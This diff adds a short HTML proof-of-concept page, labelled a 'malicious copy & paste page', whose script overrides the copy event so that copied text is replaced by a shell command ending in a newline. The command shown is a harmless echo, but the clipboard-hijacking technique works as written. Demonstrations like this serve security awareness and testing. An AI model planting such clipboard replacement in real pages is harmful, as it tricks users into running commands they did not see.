@@ -1,0 +1,13 @@
+<html>
+  <body>
+    Malicious copy & paste page
+
+    <p id="poc1">Proof of concept 1 (copy text from this element)</p>
+    <script>
+    	document.getElementById('poc1').addEventListener('copy', function(e) {
+	    	e.clipboardData.setData('text/plain', 'echo "get hacked nub!"\n');
+	    	e.preventDefault();
+	    	});
+    </script>
+  </body>
+</html>
